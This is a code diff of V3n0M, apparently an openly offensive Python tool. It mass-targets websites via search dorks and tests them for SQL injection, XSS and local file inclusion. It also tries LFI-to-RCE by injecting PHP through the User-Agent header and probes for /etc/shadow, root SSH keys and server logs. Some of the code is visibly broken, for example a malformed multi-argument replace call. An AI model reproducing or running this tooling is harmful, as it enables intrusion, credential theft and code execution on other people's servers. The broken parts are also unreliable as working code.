@@ -11,7 +11,9 @@ try:
     import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
         time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, codecs, dns
     from signal import SIGINT, signal
-    import bs4
+    import bs4, tqdm
+    from glob import glob
+    from pathlib import Path
     from codecs import lookup, register
     from random import SystemRandom
     from socket import *
@@ -21,11 +23,15 @@ try:
 except:
     print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
     print("|--- You are advised to run either or both steps below   ---| ")
-    print("|--- Recovery Menu is in early testing stage please let me know if you have any problems with it.   ---| ")
+    print("|--- Recovery Menu :::: please let me know if you have any problems with it!   ---| ")
     print("| --Note, if your running Ubuntu you may need to run --> sudo apt-get install python3-bs4 --| ")
+    print(" ")
+    print("             V3n0M python modules can be updated with either option below            ")
     print("[1] Run Pip3 and Auto-Update Python3 modules to latest versions, Requires Sudo or Root")
     print("[2] Run Pip3 and Auto-Install all the required v3n0m modules, Requires Sudo  or Root")
     print("[3] Exit")
+    print(" ")
+    print(" ")
     print(" Note: Both recovery options will at the end, perform a check at the end so everything is upto date")
     chce = input(":")
     import time
@@ -40,19 +46,23 @@ except:
         time.sleep(10)
         for dist in pip.get_installed_distributions():
             call("sudo pip3 install --upgrade --no-deps --force-reinstall " + dist.project_name, shell=True)
-            call("sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3 install -U", shell=True)
+            call("sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3 install -U",
+                 shell=True)
             pass
         pass
     if chce == '2':
         sys.stdout.flush()
-        print("This will install the missing modules and upgrade them to current versions then update your Python3 entirely")
+        print(
+            "This will install the missing modules and upgrade them to current versions then update your Python3 entirely")
         print("You will have 10 seconds to cancel this action before the system begins")
         time.sleep(10)
         call("sudo pip3 install dns --upgrade ", shell=True)
         call("sudo pip3 install aiohttp --upgrade ", shell=True)
         call("sudo pip3 install asyncio --upgrade ", shell=True)
+        call("sudo pip3 install glob --upgrade ", shell=True)
         call("sudo pip3 install bs4 --upgrade ", shell=True)
         call("sudo pip3 install dnspython --upgrade ", shell=True)
+        call("sudo pip3 install tqdm --upgrade ", shell=True)
         call("sudo pip3 install datetime --upgrade ", shell=True)
         call("sudo pip3 install requests --upgrade ", shell=True)
         call("sudo pip3 install socksipy-branch --upgrade ", shell=True)
@@ -63,20 +73,25 @@ except:
         exit()
 
 __name__ = '__main__'
+
+
 # Banner
 def logo():
+    cache_Check()
     print(R + "\n|----------------------------------------------------------------|")
-    print("| Release Date Nov 12th 2016 " + B + "           NovaCygni  Architect    " + R + " |")
-    print("|        Proxy Enabled " + G + " [",ProxyEnabled,"] " + R + "                               |")
-    print("| "  + O + "Features: " + R + "                                                     |")
-    print("| "  + O + "SQli-Dorker XSS&LFI>RCE DNS-Bruteforcer " + R + "                       |")
-    print("| "  + O + "Cloudflare-Resolver FTP-Crawler AdminPage-Finder " + R + "              |")
+    print("| Release Date Mar 27th 2017 " + B + "           NovaCygni &  Architect  " + R + " |")
+    print("|        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               |")
+    print("|        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           |")
+    print("| " + O + "Features: " + R + "     " + O + "SQli-Dorker XSS&LFI>RCE DNS-Bruteforcer " + R + "        |")
+    print("|              " + O + "  Toxin-Vulnerable-IPs-Scanner     " + R + "               |")
+    print("|                " + O + "Cloudflare-Resolver  AdminPage-Finder " + R + "          |")
     print("|                    _____       _____                           |")
     print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
     print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
     print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
     print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
-    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",current_version, " \
+    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",
+          current_version, " \
 |")
     print("|----------------------------------------------------------------|\n")
 
@@ -91,6 +106,7 @@ class Injthread(threading.Thread):
         self.fcount = 0
         self.check = True
         threading.Thread.__init__(self)
+
     def run(self):
         urls = list(self.hosts)
         for url in urls:
@@ -102,6 +118,7 @@ class Injthread(threading.Thread):
             except KeyboardInterrupt:
                 pass
         self.fcount += 1
+
     def stop(self):
         self.check = False
 
@@ -112,6 +129,7 @@ class Lfithread(threading.Thread):
         self.fcount = 0
         self.check = True
         threading.Thread.__init__(self)
+
     def run(self):
         urls = list(self.hosts)
         for url in urls:
@@ -123,6 +141,7 @@ class Lfithread(threading.Thread):
             except KeyboardInterrupt:
                 pass
         self.fcount += 1
+
     def stop(self):
         self.check = False
 
@@ -133,6 +152,7 @@ class xssthread(threading.Thread):
         self.fcount = 0
         self.check = True
         threading.Thread.__init__(self)
+
     def run(self):
         urls = list(self.hosts)
         for url in urls:
@@ -144,44 +164,52 @@ class xssthread(threading.Thread):
             except KeyboardInterrupt:
                 pass
         self.fcount += 1
+
     def stop(self):
         self.check = False
 
 
+## NEEDS FIXING ##
 # noinspection PyBroadException
 def classiclfi(url):
-  lfiurl = url.rsplit('=', 1)[0]
-  if lfiurl[-1] != "=":
-      lfiurl += "="
-  for lfi in lfis:
-    try:
-         check = urllib.request.urlopen(lfiurl+lfi.replace("n", "")).read()
-         if re.findall("root:x", check):
-            print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
-            lfi_log_file.write("n"+lfiurl+lfi)
-            vuln.append(lfiurl+lfi)
-            target = lfiurl+lfi
-            target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00", "../../../../../etc/passwd%00",
-                                    "/etc/shadow", "/etc/issue", "/etc/group", "/etc/hostname", "/etc/ssh/ssh_config",
-                                    "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/home/user/.ssh/authorized_keys",
-                                    "/home/user/.ssh/id_rsa", "/etc/apache2/apache2.conf", "/usr/local/etc/apache2/httpd.conf"
-                                    , "/etc/httpd/conf/httpd.conf", "/var/log/apache2/access.log", "/var/log/httpd-access.log",
-                                     "/var/log/httpd/access_log")
-            header = "<? echo md5(NovaCygni); ?>"
-            try:
-                request_web = urllib.request.Request(target)
-                request_web.add_header('User-Agent', header)
-                request_web.add_header = [("connection", "keep-alive"), "Cookie"]
-                text = urllib.request.urlopen(request_web)
-                text = text.read()
-                if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
-                    print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
-                    rce_log_file.write(target)
-                    vuln.append(target)
-            except:
-                pass
-    except:
-        pass
+    lfiurl = url.rsplit('=', 1)[0]
+    if lfiurl[-1] != "=":
+        lfiurl += "="
+    for lfi in lfis:
+        try:
+            check = urllib.request.urlopen(lfiurl + lfi.replace("n", "")).read()
+            if re.findall("root:x", check):
+                print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
+                lfi_log_file.write("n" + lfiurl + lfi)
+                vuln.append(lfiurl + lfi)
+                target = lfiurl + lfi
+                target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00",
+                                        "../../../../../etc/passwd%00",
+                                        "/etc/shadow", "/etc/issue", "/etc/group", "/etc/hostname",
+                                        "/etc/ssh/ssh_config",
+                                        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
+                                        "/home/user/.ssh/authorized_keys",
+                                        "/home/user/.ssh/id_rsa", "/etc/apache2/apache2.conf",
+                                        "/usr/local/etc/apache2/httpd.conf"
+                                        , "/etc/httpd/conf/httpd.conf", "/var/log/apache2/access.log",
+                                        "/var/log/httpd-access.log",
+                                        "/var/log/httpd/access_log")
+                header = "<? echo md5(NovaCygni); ?>"
+                try:
+                    request_web = urllib.request.Request(target)
+                    request_web.add_header('User-Agent', header)
+                    request_web.add_header = [("connection", "keep-alive"), "Cookie"]
+                    text = urllib.request.urlopen(request_web)
+                    text = text.read()
+                    if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
+                        print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
+                        rce_log_file.write(target)
+                        vuln.append(target)
+                except:
+                    pass
+        except:
+            pass
+
 
 # noinspection PyBroadException
 def classicxss(url):
@@ -254,8 +282,8 @@ def classicinj(url):
     try:
         try:
             resp = urllib.request.urlopen(aug_url)
-        except: #if response is not Code:200 then instead of passing nothing causing hanging
-            resp = str("v3n0m") # to throw a value to stop null/non-200-status messages hanging the scanner
+        except:  # if response is not Code:200 then instead of passing nothing causing hanging
+            resp = str("v3n0m")  # to throw a value to stop null/non-200-status messages hanging the scanner
         hits = str(resp.read())
         if str("error in your SQL syntax") in hits:
             print(url + " is vulnerable --> MySQL Classic")
@@ -588,6 +616,7 @@ def colfinder():
 
 # noinspection PyBroadException,PyGlobalUndefined
 def fscan():
+    import time
     global pages_pulled_as_one
     global usearch
     global numthreads
@@ -605,7 +634,8 @@ def fscan():
     darkurl = []
     loaded_Dorks = []
     print(W)
-    sites = input("\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
+    sites = input(
+        "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
     sitearray = [sites]
     dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
     print("")
@@ -630,6 +660,7 @@ def fscan():
     print("Dorks           :", len(loaded_Dorks))
     print("Pages           :", pages_pulled_as_one)
     print("Timeout         :", timeout)
+    time.sleep(6)
     loop = asyncio.get_event_loop()
     usearch = loop.run_until_complete(search(pages_pulled_as_one))
     vulnscan()
@@ -641,7 +672,20 @@ def cloud():
     target_site = input("Enter the site eg target.com: \n")
     print(B)
     pwd = os.path.dirname(str(os.path.realpath(__file__)))
-    cloud = subprocess.Popen('python ' + pwd + "/cloudbuster.py " + str(target_site), shell=True)
+    print("Depth Level: 1) Scan top 30 subdomains 2) Scan top 200 subdomains 3) Scan over 9000+ subdomains ")
+    depth = input("Input Depth Level, 1, 2 or 3")
+    scandepth = ""
+    if depth == 1:
+        scandepth = "--dept simple"
+    elif depth == 2:
+        scandepth = "--dept normal"
+    elif depth == 3:
+        scandepth = "--dept full"
+    else:
+        print("Depth level not selected properly, the correct input should be: 1 2 or 3")
+        time.sleep(4)
+        fmenu()
+    cloud = subprocess.Popen('python ' + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True)
     cloud.communicate()
     subprocess._cleanup()
     print("Cloud Resolving Finished")
@@ -672,7 +716,8 @@ def vulnscan():
     xss_log_file = open("v3n0m-xss.txt", "a")
     endsub = 0
     print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
-    print(R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
+    print(
+        R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
     print(R + "[3] LFI - RCE Testing [!] Broken, Please Wait for fix [!]")
     print(R + "[4] XSS Testing")
     print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
@@ -732,6 +777,7 @@ def vulnscan():
 
 
 # noinspection PyBroadException
+
 def ignoringGet(url):
     try:
         try:
@@ -740,22 +786,9 @@ def ignoringGet(url):
         except Exception:
             return ''
         return responce.text
-    except KeyboardInterrupt:
-        os.system('clear')
-        chce1 = input(':')
-        logo()
-        print(G + "Program Paused" + R)
-        print("[1] Unpause")
-        print("[2] Skip rest of scan and Continue with current results")
-        print("[3] Return to main menu")
-        if chce1 == "1":
-            return
-        if chce1 == "2":
-            vulnscan()
-        if chce1 == "3":
-            fmenu()
-        else:
-            pass
+    except Exception:
+        print(Exception)
+
 
 
 def CreateTempFolder(self):
@@ -777,12 +810,12 @@ def upgrade():
             page = sock
             try:
                 if str("Release 412" or "Release 413" or
-                       "Release 44" or "Release 45" or "Release 46" or "Release 47" or "Release 48" or "Release 49"
+                               "Release 44" or "Release 45" or "Release 46" or "Release 47" or "Release 48" or "Release 49"
                        or "Release 5" or "Release 6" or "Release 7" or "Release 8" or "Release 9") in page:
                     revision = int(411)
                 else:
                     revision = current_version
-                    print( R + ' [!]' + W + ' Current version is either Latest or No Update was detected')
+                    print(R + ' [!]' + W + ' Current version is either Latest or No Update was detected')
                     time.sleep(4)
                     pass
             except KeyboardInterrupt:
@@ -790,8 +823,8 @@ def upgrade():
         except KeyboardInterrupt:
             pass
         if revision >= current_version:
-            print(R+ " [!] [Program Debug Info] I did revision as", G + str(revision), R + "and current version as",
-                 G + str(current_version))
+            print(R + " [!] [Program Debug Info] I did revision as", G + str(revision), R + "and current version as",
+                  G + str(current_version))
             print(R + ' [!]' + W + ' a new version is ' + G + 'available!' + W)
             print(R + ' [-]' + W + '   revision:    ' + G + str(revision), 'or Higher Available' + W)
             response = input(R + ' [+]' + W + ' do you want to upgrade to the latest version? (y/n): ')
@@ -886,13 +919,14 @@ async def search(pages_pulled_as_one):
                 logo()
                 sys.stdout.write(W +
                                  "\r\x1b[K " + R + "| Domain: <%s> Has been targeted \n "
-                                                  "| Collected urls: %s Since start of scan \n"
+                                                   "| Collected urls: %s Since start of scan \n"
                                                    " | D0rks: %s/%s Progressed so far \n"
                                                    " | Percent Done: %s \n"
                                                    " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
                                                    " | Dork In Progress: %s\n"
                                                    " | Elapsed Time: %s\n" % (R +
-                                                                              site, repr(urls_len), progress, totalprogress,
+                                                                              site, repr(urls_len), progress,
+                                                                              totalprogress,
                                                                               repr(percent), repr(page), dork,
                                                                               '%s:%s:%s' % (hours, minutes, seconds)))
                 sys.stdout.flush()
@@ -936,9 +970,9 @@ def fmenu():
     if endsub != 1:
         vulnscan()
     logo()
-    print("[1] Dork and vuln scan")
+    print("[1] Dork and Vuln Scan")
     print("[2] Admin page finder")
-    print("[3] FTP crawler and vuln scan")
+    print("[3] Toxin - Vulnerable IPs Scanner  **NOT RELEASED YET: NOT FINISHED: DONT BOTHER TRYING **")
     print("[4] DNS brute")
     print("[5] Enable Tor/Proxy Support")
     print("[6] Misc Options")
@@ -960,19 +994,19 @@ def fmenu():
         subprocess._cleanup()
 
     elif chce == '3':
-        randips = input("How many IP addresses do you want to scan: ")
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
+        ftpcrawl = subprocess.Popen(pwd + "/modules/toxin.py -i " , shell=True)
         ftpcrawl.communicate()
         subprocess._cleanup()
 
     elif chce == '4':
         target_site = input("Enter the site eg target.com: ")
+
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(target_site),
-                                    shell=True)
+        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(target_site)
+                                    ,shell=True)
         dnsbrute.communicate()
         subprocess._cleanup()
 
@@ -990,25 +1024,31 @@ def fmenu():
         os.system('clear')
         logo()
         print("[1] Skip to custom SQLi list checking")
-        print("[2] Cloudflare IP Resolver")
+        print("[2] Cloudflare IP Resolver *Advanced Options Submenu now available")
+        print("[3] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
             os.system('clear')
             logo()
             try:
-
                 temp = input("Please Input Custom List Path \n"
-                                                           "ie> \n"
-                                                           "/home/user/Desktop/samples.txt \n")
+                             "ie> \n"
+                             "/home/user/Desktop/samples.txt \n")
                 url = [line.strip() for line in open(temp, 'r')]
                 classicinj([url])
             except FileNotFoundError:
                 print("Target file not found!")
+                time.sleep(2)
                 fmenu()
         elif chce2 == '2':
             cloud()
             fmenu()
+        elif chce2 == '3':
+            for filename in glob("*.txt"):
+                os.remove(filename)
+                print("Cache has been cleared, all logs have been deleted")
+                time.sleep(2)
         elif chce2 == '0':
             fmenu()
 
@@ -1037,7 +1077,8 @@ args = parser.parse_args()
 def enable_proxy():
     global ProxyEnabled
     try:
-        requiresID = bool(input("Requires Username/Password? Leave Blank if not required, otherwise type y/yes/true/True  :"))
+        requiresID = bool(
+            input("Requires Username/Password? Leave Blank if not required, otherwise type y/yes/true/True  :"))
         print(requiresID)
         print("Please select Proxy Type - Options = socks4, socks5  : ")
         proxytype = input(str())
@@ -1089,15 +1130,12 @@ def enable_proxy():
 
 try:
     codecs.lookup('mbcs')
-
 except LookupError:
     ascii_encoding = codecs.lookup('latin-1')
-
 
     def mbcs_bypass(name, encoding=ascii_encoding):
         if name == "mbcs":
             return encoding
-
 
     codecs.register(mbcs_bypass)
 
@@ -1109,6 +1147,17 @@ O = "\033[33m"
 B = "\033[34m"
 
 
+def cache_Check():
+    global cachestatus
+    my_file1 = Path("v3n0m-lfi.txt")
+    my_file2 = Path("v3n0m-rce.txt")
+    my_file3 = Path("v3n0m-xss.txt")
+    my_file5 = Path("v3n0m-sqli.txt")
+    my_file4 = Path("IPLogList.txt")
+    if my_file1.is_file() or my_file2.is_file() or my_file3.is_file() or my_file4.is_file() or my_file5.is_file():
+        cachestatus = "** Cache NOT Empty**"
+    else:
+        cachestatus = "Logs Cache is Empty "
 
 
 subprocess.call("clear", shell=True)
@@ -1119,8 +1168,8 @@ endsub = 1
 gets = 0
 timeout = 14
 file = "/etc/passwd"
-ProxyEnabled=False
+ProxyEnabled = False
 menu = True
-current_version = str("411  ")
+current_version = str("412  ")
 while True:
     fmenu()
